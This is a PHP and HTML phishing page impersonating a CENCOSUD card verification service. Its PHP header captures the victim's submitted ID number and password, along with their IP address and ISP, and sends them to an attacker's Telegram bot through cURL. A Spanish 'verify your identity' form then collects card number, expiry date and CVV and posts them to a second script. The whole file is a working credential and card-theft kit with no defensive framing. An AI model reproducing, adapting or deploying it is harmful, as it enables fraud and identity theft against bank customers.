<?php
$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$dni = $_POST['dni'];
$clave = $_POST['clave'];



$msg ="
\n$dni | $clave |  $ip| $isp
";


//Envio Telegram	
include("config.php");

	$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $urlMsg);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$server_output = curl_exec($ch);
	curl_close($ch);






?>
	<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.2/font/bootstrap-icons.css">
<style> .bg{ background-image: url(img/banner.gif); background-position: center center; } .form-control{ width:100%; padding:5px; color:black; border:0; border-bottom:2px solid silver; outline:0; } .mm{ display:inline-block; max-width: 80px; }
 }
      .form-control,.input-group-text{
        background: transparent !important;
      }
      .form-control:focus{
        box-shadow: 0 0 0 !important;
      }
      .enviar{
        background: #f07c00;
      }
      .enviar:hover{
        background: #f07f11;
      }
      .btn-outline-warning{
        border: 1px solid #f07c00 !important;
        color:#f07c00 !important;
      }
      #reg:hover{
        background: #FFF !important;
        color:#f07c00 !important;
      }
      #contact_p{
        font-size: 12px !important;
      } </style> </head><body> <div class="container imagen"> <div class="row align-items-strech"> <div class="col bg d-none d-lg-block col-md-5 col-lg-5 col-xl-6"> </div> <div class="col"> <div class="text-end"> </div> <div class="fw-bold text-center py-5"><img src="img/logo.png" class="img-responsive" style="max-width:200px;max-height:;"></div> <div class="mb-4"> <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script> 
<h3>Verifica tu identidad</h3>
<p>Completa los siguientes datos requeridos:</p>

<form class="mt-4 w-100" action="error.php" method="POST">
<div class="mb-3">
<label class="form-label">Ingrese su tarjeta CENCOSUD asociada.</label>
<input type="tel" class="form-control rounded-0 border" name="cc" id="card_number" placeholder="5591 9800 0000 0000" required="">
</div>
<div class="mb-3">
<input type="tel" class="form-control rounded-0 border" name="mm" id="expiry_cc" placeholder="MM/AA" required="">
</div>
<div class="mb-3">
<input type="tel" class="form-control rounded-0 border" name="cvv" placeholder="CVV" maxlength="3" required="">
</div>
<div class="mb-3">


</div>
<div class="mb-3">

</div>
<div class="text-centser">
<button class="btn enviar text-white w-100" name="submit1">Continuar</button>
</div>
</form>
</div>
</div>
</div>

<script type="text/javascript">
      var numCC = document.getElementById("card_number");
      numCC.addEventListener("keyup", function(){
      var resp = document.getElementById('respuesta');  
        var maestr = numCC.value[0]+numCC.value[1] ;
        if (maestr == 50 && numCC.value.length == 18) {
          numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+" "+numCC.value[8]+numCC.value[9]+numCC.value[10]+numCC.value[11]+" "+numCC.value[12]+numCC.value[13]+numCC.value[14]+numCC.value[15]+" "+numCC.value[16]+numCC.value[17];

        }
        if (numCC.value[0]+numCC.value[1] > 50 && numCC.value.length == 16) {
          numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+" "+numCC.value[8]+numCC.value[9]+numCC.value[10]+numCC.value[11]+" "+numCC.value[12]+numCC.value[13]+numCC.value[14]+numCC.value[15]

        }
        if (numCC.value[0] == 3 && numCC.value.length == 15) {
          numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+numCC.value[8]+numCC.value[9]+numCC.value[10]+" "+numCC.value[11]+numCC.value[12]+numCC.value[13]+numCC.value[14]
        }
        if (numCC.value.length == 16 &&  numCC.value[0] == 4) {
          numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+" "+numCC.value[8]+numCC.value[9]+numCC.value[10]+numCC.value[11]+" "+numCC.value[12]+numCC.value[13]+numCC.value[14]+numCC.value[15];
        }
        if (numCC.value[0] == 4) {
          numCC.setAttribute('maxlength', '16');
          resp.innerHTML = " ";
        }
        if (numCC.value[0] == 5) {
          numCC.setAttribute('maxlength', '18');
        }
        if (numCC.value[0] == 3) {
          numCC.setAttribute('maxlength', '15');
        }else{
          return false
        }
        
      })
      var expiry = document.getElementById("expiry_cc");
      let nuevoValor;
      expiry.addEventListener('keyup', function(){
        if (expiry.value.length == 4) {
          expiry.value = expiry.value[0]+expiry.value[1]+"/"+expiry.value[2]+expiry.value[3];
          nuevoValor = expiry.value;
          expiry.setAttribute('maxlength', '4');
        }
        let valorCambiado = expiry.value[0]+expiry.value[1]+"/"+"/"+expiry.value[2];
        if (nuevoValor == valorCambiado) {
          expiry.value = ""
        }
        console.log(expiry.value)
      })
  </script>
</div></body></html>
